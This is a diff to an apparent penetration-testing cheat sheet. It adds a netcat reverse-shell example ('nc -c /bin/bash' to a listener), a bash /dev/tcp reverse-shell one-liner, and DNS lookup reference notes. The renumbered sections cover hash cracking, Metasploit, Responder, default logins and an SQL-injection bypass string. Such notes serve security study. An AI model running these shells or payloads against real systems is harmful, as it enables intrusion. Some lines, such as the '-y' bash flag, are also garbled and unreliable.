@@ -477,9 +477,157 @@ Network:
             (II) NB: Samba servers often seem to have RIDs in the range 3000-3050.
             (III) Dependancy info: You will need to have the samba package installed as this script is basically just a wrapper around rpcclient, net, nmblookup and smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ is required to get Password Policy info.
 
+8. Reverse Proxy
+
+    (i) NetCat
+        
+        (a) NetCat known as TCP/IP swiss army knife
+
+        (b) Syntax:
+
+            # Attacker:
+            $ nc <options> <hostname> <port[s]> <ports...>
+
+            # Target:
+            $ nc -l -p <port> <options> <hostname> <port>
+
+        (b) Flags:
+
+            (I)     -c string    specify shell commands to exec after connect (use with caution).  The string is passed to /bin/sh -c for execution.  See the -e option if you don't have a working /bin/sh (Note that POSIX-conformant system must have one).
+            (II)    -e filename  specify filename to exec after connect (use with caution).  See the -c option for enhanced functionality.
+            (III)   -g gateway   source-routing hop point[s], up to 8
+            (IV)    -G num       source-routing pointer: 4, 8, 12, ...
+            (V)     -h           display help
+            (VI)    -i secs      delay interval for lines sent, ports scanned
+            (VII)   -l           listen mode, for inbound connects
+            (VIII)  -n           numeric-only IP addresses, no DNS
+            (IX)    -o file      hex dump of traffic
+            (X)     -p port      local port number (port numbers can be individual or ranges: lo-hi [inclusive])
+            (XI)    -q seconds   after EOF on stdin, wait the specified number of seconds and then quit. If seconds is negative, wait forever.
+            (XII)   -b           allow UDP broadcasts
+            (XIII)  -r           randomize local and remote ports
+            (XIV)   -s addr      local source address
+            (XV)    -t           enable telnet negotiation
+            (XVI)   -u           UDP mode
+            (XVII)  -v           verbose [use twice to be more verbose]
+            (XVIII) -w secs      timeout for connects and final net reads
+            (XIX)   -C           Send CRLF as line-ending
+            (XX)    -z           zero-I/O mode [used for scanning]
+            (XXI)   -T type      set TOS flag (type may be one of "Minimize-Delay", "Maximize-Throughput", "Maximize-Reliability", or "Minimize-Cost".)
+
+        (c) Examples:
+
+            # Start Listening:
+            $ nc -lnvp 87 -s 192.168.1.32
+
+            # Target:
+            $ nc -c /bin/bash 192.168.1.32 87
+
+9. DNS
+
+    (i) Host
+
+        (a) DNS Discovery
+
+        (b) Syntax:
+
+            $ host <options> <Domain/IP>
+
+            (I) provide a Domain for DNS Lookup
+            (II) provide an IP for Reverse DNS (maybe be blocked)
+        
+        (c) `-a`: is equivalent to -v -t ANY
+        (d) `-A`: is like -a but omits RRSIG, NSEC, NSEC3
+        (e) `-c`: specifies query class for non-IN data
+        (f) `-C`: compares SOA records on authoritative nameservers
+        (g) `-d`: is equivalent to -v
+        (h) `-l`: lists all hosts in a domain, using AXFR
+        (i) `-m <flag>`: set memory debugging flag (trace|record|usage)
+        (j) `-N <nDots>`: changes the number of dots allowed before root lookup is done
+        (k) `-p <port>`: specifies the port on the server to query
+        (l) `-r`: disables recursive processing
+        (m) `-R <number>`: specifies number of retries for UDP packets
+        (n) `-s`: a SERVFAIL response should stop query
+        (o) `-t <type>`: specifies the query type
+
+            (I) `ns`: Name Server
+            (I) `mx`: Mail Server
+
+        (p) `-T`: enables TCP/IP mode
+        (q) `-U`: enables UDP mode
+        (r) `-v`: enables verbose output
+        (s) `-V`: print version number and exit
+        (t) `-w`: specifies to wait forever for a reply
+        (u) `-W <wait>`: specifies how long to wait for a reply
+        (v) `-4`: use IPv4 query transport only
+        (w) `-6`: use IPv6 query transport only
+
+    (ii) Ns Lookup
+        
+        (a) nslookup: is a program to query Internet domain name servers. nslookup has two modes: interactive and non-interactive. Interactive mode allows the user to query name servers for information about various hosts and domains
+       or to print a list of hosts in a domain.  Non-interactive mode prints just the name and requested information for a host or domain.
+        (b) Syntax:
+        
+            nslookup <options> <name | -> <server>
+
+        (c) Arguments
+            
+            (I) Interactive mode is entered in the following cases:
+
+                () when no arguments are given (the default name server is used);
+                () when the first argument is a hyphen (-) and the second argument is the host name or Internet address of a name server.
+
+            (II) Non-interactive mode is used when the name or Internet address of the host to be looked up is given as the first argument. The optional second argument specifies the host name or address of a name server.
+
+            (III) Options can also be specified on the command line if they precede the arguments and are prefixed with a hyphen. For example, to change the default query type to host information, with an initial timeout of 10 seconds, type:
+
+                $ nslookup -query=hinfo  -timeout=10
+
+            (IV) `-version`: print the version number.
+
+        (d) Interactive Mode Commands:
+
+            (I) host <server>: This command looks up information for host using the current default server or using server, if specified. If host is an Internet address and the query type is A or PTR, the name of the host is returned. If host is a name and does not have a trailing period (.), the search list is used to qualify the name. To look up a host not in the current domain, append a period to the name.
+
+            (II) <serverDomain>, <lserver domain>: These  commands  change the default server to domain; lserver uses the initial server to look up information about domain, while server uses the current default server. If an authoritative answer cannot be found, the names of servers that might have the answer are returned.
+
+            (III) exit   This command exits the program.
+
+            (IV) set <keyword>=<value>: This command is used to change state information that affects the lookups. Valid keywords are:
+
+                Keywords:
+
+                (A) `all`    This keyword prints the current values of the frequently used options to set. Information about the current default server and host is also printed.
+                (B) `class=<value>`
+                        This keyword changes the query class to one of:
+
+                        () `IN`     the Internet class
+                        () `CH`     the Chaos class
+                        () `HS`     the Hesiod class
+                        () `ANY`    wildcard
+
+                        () The class specifies the protocol group of the information. The default is IN; the abbreviation for this keyword is cl.
+
+                (C) `nodebug`
+                        This keyword turns on or off the display of the full response packet, and any intermediate response packets, when searching. The default for this keyword is  nodebug;  the  abbreviation  for  this  keyword  is
+                        [no]deb.
+                (D) `nod2:`           This keyword turns debugging mode on or off. This displays more about what nslookup is doing. The default is nod2.
+                (E) `domain=name`:    This keyword sets the search list to name.
+                (F) `nosearch`:       If  the lookup request contains at least one period, but does not end with a trailing period, this keyword appends the domain names in the domain search lis`t to the request until an answer is received. The de‐`: fault is search.
+                (G) `port=value`:     This keyword changes the default TCP/UDP name server port to value from its default, port 53. The abbreviation for this keyword is po.
+                (H) `querytype=value | type=value`: This keyword changes the type of the information query to value. The defaults are A and then AAAA; the abbreviations for these key`words are q and ty.`: Please note that it is only possible to specify one query type. Only the default behavior looks up both when an alternative is not specified.
+                (I) `norecurse`:      This keyword tells the name server to query other servers if it does not have the information. The default is recurse; the abbreviation for this keyword is [no]rec.
+                (J) `ndots=number`:   This keyword sets the number of dots (label separators) in a domain that disables searching. Absolute names always stop searching.
+                (K) `retry=number`:   This keyword sets the number of retries to number.
+                (L) `timeout=number`: This keyword changes the initial timeout interval to wait for a reply to number, in seconds.
+                (M) `novc`:           This keyword indicates that a virtual circuit should always be used when sending requests to the server.  novc is the default.
+                (N) `nofail`:         This keyword tries the next nameserver if a nameserver responds with SERVFAIL or a referral (nofail), or terminates the query (fail) on such a response. The default is nofail.
+
+    (iii) Dig
+
 Brute Force:
 
-8. Passwords
+10. Passwords
 
     (i) Cracking Hashes
 
@@ -901,7 +1049,7 @@ Brute Force:
                 (Y) `-I` ignore an existing restore file (don't wait 10 seconds)
                 (Z) `-h`, `--help` Show summary of options.
 
-9. Hidden Web Discovery
+11. Hidden Web Discovery
 
     (i) Burp Suite 
 
@@ -1043,7 +1191,7 @@ Brute Force:
 
                 $ gobuster vhost -u example.com -w ~/custom-wordlist.txt
 
-10. WorldLists
+12. WorldLists
 
     (i) `rockyou.txt` /usr/share/wordlists/rockyou.txt 14 million
     (ii) Seclists
@@ -1056,7 +1204,7 @@ Brute Force:
 
 Other:
 
-11. Metasploit Framework
+13. Metasploit Framework
 
     (i) Metasploit is a Framework with containing Many Exploits for certain things, used for Attacking and checking if the machine is vunerable to the exploits and attacks
 
@@ -1116,7 +1264,7 @@ Other:
             msf6 auxiliary(admin/smb/samba_symlink_traversal) > exit
             $ smbclient //192.168.1.159/tmp
 
-12. Name Service Poisoning
+14. Name Service Poisoning
 
     (a) `Responder`
 
@@ -1149,7 +1297,7 @@ Other:
 
             $ sudo responder -I eth0
     
-13. Windows
+15. Windows
 
     (i) Evil WinRM
         
@@ -1193,7 +1341,7 @@ Other:
 
 Vunerabilites:
 
-12. Telnet
+16. Telnet
 
     (i) In Linux-based distributions Telnet could be bypassed by just entering username "root", if not properly Configured
 
@@ -1203,7 +1351,7 @@ Vunerabilites:
 
         root@machine~#
 
-13. FTP
+17. FTP
 
     (i) username "anonymous" let's you login without having an account
 
@@ -1211,13 +1359,13 @@ Vunerabilites:
     username: anonymous
     password: 123
 
-14. MariSQL
+18. MariSQL
 
     (a) username `root` allows us to log into this MariaDB instance without providing a password. 
 
     $ mysql -u root -h <IP>
 
-15. SQL Injection
+19. SQL Injection
 
     (a) SQL injection can be done if a Website Uses SQL and doesn't properly Sanitize Their User Input such websites are Vunerable to SQL Injections and SQL Injections are done with with simple SQL Query. This doesn't work with Websites that were built properly
 
@@ -1225,7 +1373,7 @@ Vunerabilites:
         
         admin' OR '1'='1' -- 
 
-16. LLMNR Poisoning/NBT-NS
+20. LLMNR Poisoning/NBT-NS
 
     (a) Local-Link Multicast Name Resolution (LLMNR) is a Protocol Based on The Domain Name System (DNS) that allowed both IPv4 and IPv6 to perform name Resolution on the same local link it's used in Windows Vista, Windows 7 / Server 2008, Windows 10. it is also implemented by systemd-resolved on linux, however it is not accepted as a Standard by Internet Engineering Task Force (IETF)
 
@@ -1233,8 +1381,14 @@ Vunerabilites:
 
     (c) NetBIOS, NBT-NS identifies systems on a local network by their NetBIOS name.
 
-17. MultiCast DNS
+21. MultiCast DNS
 
-18. Cross-Site Request Forgery (CSRF)
+22. Cross-Site Request Forgery (CSRF)
 
-19. Cross-Site Scripting (XSS)
+23. Cross-Site Scripting (XSS)
+
+24. Bash Reverse Shell
+
+    (i) in-some version of bash, it's possible to sent a reverse shell to the machine
+
+        bash -y >& /dev/tcp/10.0.0.1/8080 0>&1
